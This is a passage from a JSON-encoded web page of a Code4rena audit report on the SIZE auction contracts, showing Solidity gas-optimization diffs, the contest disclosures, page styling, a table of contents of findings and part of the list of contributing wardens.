class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Gas saving executing: <strong>13 per entry</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">TesterA.testShort: 43507</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">TesterB.testLong:  43494</span></span></code></pre>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L294\">SizeSealed.sol:294</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L373\">SizeSealed.sol:373</a></li>\n</ul>\n<h3 id=\"total-gas-saved-13--2--26\" style=\"position:relative;\"><a href=\"#total-gas-saved-13--2--26\" aria-label=\"total gas saved 13  2  26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Total gas saved: <strong>13 * 2 = 26</strong></h3>\n<h2 id=\"g-05-optimize-variable-definitions\" style=\"position:relative;\"><a href=\"#g-05-optimize-variable-definitions\" aria-label=\"g 05 optimize variable definitions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Optimize variable definitions</h2>\n<p>Where a variable is defined, it is important to avoid unnecessary expense prior to the appropriate validations.</p>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/util/ECCMath.sol#L26\">ECCMath.sol:26</a> can be optimized like:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @notice calculates point^scalar</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @dev returns (1,1) if the ecMul failed or invalid parameters</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    /// @return corresponding point</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function ecMul(Point memory point, uint256 scalar) internal view returns (Point memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       bytes memory data = abi.encode(point, scalar);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (scalar == 0 || (point.x == 0 &amp;&amp; point.y == 0)) return Point(1, 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       (bool res, bytes memory ret) = address(0x07).staticcall{gas: 6000}(data);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       (bool res, bytes memory ret) = address(0x07).staticcall{gas: 6000}(abi.encode(point, scalar));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (!res) return Point(1, 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        return abi.decode(ret, (Point));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L157\">SizeSealed.sol:157</a> can be optimized like:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function bid(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 auctionId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint128 quoteAmount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32 commitment,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ECCMath.Point calldata pubKey,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32 encryptedMessage,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes calldata encryptedPrivateKey,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bytes32[] calldata proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) external atState(idToAuction[auctionId], States.AcceptingBids) returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       uint256 bidIndex = a.bids.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       // Max of 1000 bids on an auction to prevent DOS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       if (bidIndex &gt;= 1000) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           revert InvalidState();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        EncryptedBid memory ebid;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ebid.sender = msg.sender;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ebid.quoteAmount = quoteAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ebid.commitment = commitment;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ebid.pubKey = pubKey;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ebid.encryptedMessage = encryptedMessage;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       uint256 bidIndex = a.bids.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       // Max of 1000 bids on an auction to prevent DOS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       if (bidIndex &gt;= 1000) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-           revert InvalidState();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        a.bids.push(ebid);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        SafeTransferLib.safeTransferFrom(ERC20(a.params.quoteToken), msg.sender, address(this), quoteAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        emit Bid(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            msg.sender, auctionId, bidIndex, quoteAmount, commitment, pubKey, encryptedMessage, encryptedPrivateKey</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        return bidIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"g-06-optimize-finalize-conditions\" style=\"position:relative;\"><a href=\"#g-06-optimize-finalize-conditions\" aria-label=\"g 06 optimize finalize conditions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Optimize <code>finalize</code> conditions</h2>\n<p>If the auction has been fully filled, it’s not required to decrypt the message and do nothing else.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function finalize(uint256 auctionId, uint256[] memory bidIndices, uint128 clearingBase, uint128 clearingQuote)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        atState(idToAuction[auctionId], States.RevealPeriod)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // Fill orders from highest price to lowest price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        for (uint256 i; i &lt; bidIndices.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            uint256 bidIndex = bidIndices[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            EncryptedBid storage b = a.bids[bidIndex];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // Verify this bid index hasn&#39;t been seen before</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            uint256 bitmapIndex = bidIndex / 256;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            uint256 bitMap = seenBidMap[bitmapIndex];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            uint256 indexBit = 1 &lt;&lt; (bidIndex % 256);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            if (bitMap &amp; indexBit == 1) revert InvalidState();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            seenBidMap[bitmapIndex] = bitMap | indexBit;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           // Auction has been fully filled</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           if (data.filledBase == data.totalBaseAmount) continue;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // G^k1^k2 == G^k2^k1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ECCMath.Point memory sharedPoint = ECCMath.ecMul(b.pubKey, sellerPriv);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // If the bidder public key isn&#39;t on the bn128 curve</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            if (sharedPoint.x == 1 &amp;&amp; sharedPoint.y == 1) continue;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            bytes32 decryptedMessage = ECCMath.decryptMessage(sharedPoint, b.encryptedMessage);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // If the bidder didn&#39;t faithfully submit commitment or pubkey</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // Or the bid was cancelled</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            if (computeCommitment(decryptedMessage) != b.commitment) continue;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // First 128 bits are the base amount, last are random salt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            uint128 baseAmount = uint128(uint256(decryptedMessage &gt;&gt; 128));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // Require that bids are passed in descending price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            if (quotePerBase &gt;= data.previousQuotePerBase) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                // If last bid was the same price, make sure we filled the earliest bid first</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                if (quotePerBase == data.previousQuotePerBase) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    if (data.previousIndex &gt; bidIndex) revert InvalidSorting();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    revert InvalidSorting();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // Only fill if above reserve price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            if (quotePerBase &lt; data.reserveQuotePerBase) continue;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-           // Auction has been fully filled</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-           if (data.filledBase == data.totalBaseAmount) continue;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L283\">SizeSealed.sol:283</a></li>\n</ul>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-2\">High Risk Findings (2)</a></p>\n<ul>\n<li><a href=\"#h-01-bidders-might-fail-to-withdraw-their-unused-funds-after-the-auction-was-finalized-because-the-contract-doesnt-have-enough-balance\">[H-01] Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn’t have enough balance.</a></li>\n<li><a href=\"#h-02-attacker-can-steal-any-funds-in-the-contract-by-state-confusion-no-preconditions\">[H-02] Attacker can steal any funds in the contract by state confusion (no preconditions)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-7\">Medium Risk Findings (7)</a></p>\n<ul>\n<li><a href=\"#m-01-incompatibility-with-fee-on-transferinflationarydeflationaryrebasing-tokens-on-both-base-tokens-and-quote-tokens-with-varying-impacts\">[M-01] Incompatibility with fee-on-transfer/inflationary/deflationary/rebasing tokens, on both base tokens and quote tokens, with varying impacts</a></li>\n<li><a href=\"#m-02-solmates-erc20-does-not-check-for-token-contracts-existence-which-opens-up-possibility-for-a-honeypot-attack\">[M-02] Solmate’s ERC20 does not check for token contract’s existence, which opens up possibility for a honeypot attack</a></li>\n<li><a href=\"#m-03-the-sorting-logic-is-not-strict-enough\">[M-03] The sorting logic is not strict enough</a></li>\n<li><a href=\"#m-04-auction-created-by-erc777-tokens-with-tax-can-be-stolen-by-re-entrancy-attack\">[M-04] Auction created by ERC777 Tokens with tax can be stolen by re-entrancy attack</a></li>\n<li><a href=\"#m-05-sellers-ability-to-decrypt-bids-before-reveal-could-result-in-a-much-higher-clearing-price-than-anticpated-and-make-buyers-distrust-the-system\">[M-05] Seller’s ability to decrypt bids before reveal could result in a much higher clearing price than anticpated and make buyers distrust the system</a></li>\n<li><a href=\"#m-06-attacker-may-dos-auctions-using-invalid-bid-parameters\">[M-06] Attacker may DOS auctions using invalid bid parameters</a></li>\n<li><a href=\"#m-07-denial-of-service-when-baseamount-is-equal-to-zero\">[M-07] Denial of service when <code>baseAmount</code> is equal to zero</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#low-risk\">Low risk</a></li>\n<li><a href=\"#non-critical\">Non-critical</a></li>\n<li><a href=\"#n-06-dont-worry-about-keccak256-collisions\">N-06 Don’t worry about keccak256 collisions</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#g-01-optimize-finalize-with-cancelled-bids\">G-01 Optimize <code>finalize</code> with cancelled bids</a></li>\n<li><a href=\"#g-02-avoid-storage-keyword-during-modifiers\">G-02 Avoid <code>storage</code> keyword during modifiers</a></li>\n<li><a href=\"#g-03-reorder-structure-layout\">G-03 Reorder structure layout</a></li>\n<li><a href=\"#g-04-avoid-compound-assignment-operator-in-state-variables\">G-04 Avoid compound assignment operator in state variables</a></li>\n<li><a href=\"#g-05-optimize-variable-definitions\">G-05 Optimize variable definitions</a></li>\n<li><a href=\"#g-06-optimize-finalize-conditions\">G-06 Optimize <code>finalize</code> conditions</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the SIZE smart contract system written in Solidity. The audit contest took place between November 4-8, 2022.\n\n## Wardens\n\n99 Wardens contributed reports to the SIZE contest:\n\n  1. 0x1f8b\n  2. 0x52\n  3. [0xSmartContract](https://twitter.com/0xSmartContract)\n  4. 0xc0ffEE\n  5. [0xdapper](https://twitter.com/0xdapper_)\n  6. 0xdeadbeef\n  7. [8olidity](https://twitter.com/8olidity)\n  8. [Aymen0909](https://github.com/Aymen1001)\n  9. B2\n  10. Bnke0x0\n  11. [Deivitto](https://twitter.com/Deivitto)\n  12. Diana\n  13. Dinesh11G\n  14. HE1M\n  15. [JC](https://twitter.com/sm4rtcontr4ct)\n  16. JTJabba\n  17. Josiah\n  18. KIntern\\_NA (TrungOre and duc)\n  19. KingNFT\n  20. Lambda\n  21. M4TZ1P ([DekaiHako](https://twitter.com/huna38699), holyhansss_kr, [Zer0Luck](https://twitter.com/younsle1), AAIIWITF and [exd0tpy](https://github.com/exd0tpy))\n  22. Matin\n  23. [Picodes](https://twitter.com/thePicodes)\n  24. PwnedNoMore ([izhuer](https://www.cs.purdue.edu/homes/zhan3299/index.html), ItsNio, papr1ka2 and [wen](https://twitter.com/0xtarafans))\n  25. R2\n  26. [Rahoz](https://www.linkedin.com/in/nhan-vo-a9473019a/)\n  27. RaymondFam\n  28. RedOneN\n  29. ReyAdmirado\n  30. Rolezn\n  31. [Ruhum](https://twitter.com/0xruhum)\n  32. [Sathish9098](https://www.linkedin.com/in/sathishkumar-p-26069915a)\n  33. [TomJ](https://mobile.twitter.com/tomj_bb)\n  34. [Trust](https://twitter.com/trust__90)\n  35. TwelveSec ([0xDecorativePineapple](https://decorativepineapple.github.io/), gkaragiannidis and 0xRav3n)\n  36. V\\_B (Barichek and vlad\\_bochok)\n  37. \\_\\_141345\\_\\_\n  38. ajtra\n  39. [aviggiano](https://twitter.com/agfviggiano)\n  40. [bin2chen](https://twitter.com/bin2chen)\n  41. brgltd\n  42. c7e7eff\n  43. cccz\n  44. chaduke\n  45. codexploder\n  46. corerouter\n  47. cryptonue\n  48. cryptostellar5\n  49. cryptphi\n  50. ctf\\_sec\n  51. delfin454000\n  52. djxploit\n  53. fs0c\n  54. gianganhnguyen\n  55. [gogo](https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219)\n  56. gz627\n  57. halden\n  58. [hansfriese](https://twitter.com/hansfriese)\n  59. hihen\n  60. horsefacts\n  61. jayphbee\n  62. [joestakey](https://twitter.com/JoeStakey)\n  63. karanctf\n  64. ktg\n  65. ladboy233\n  66. leosathya\n  67. lukris02\n  68. mcwildy\n  69. minhtrng\n  70. neko\\_nyaa\n  71. neumo\n  72. [oyc\\_109](https://twitter.com/andyfeili)\n  73. pashov\n  74. peanuts\n  75. [ret2basic](https://twitter.com/ret2basic)\n  76. ronnyx2017\n  77. rvierdiiev\n  78. sashik\\_eth\n  79. shark\n  80. simon135\n  81. skyle\n  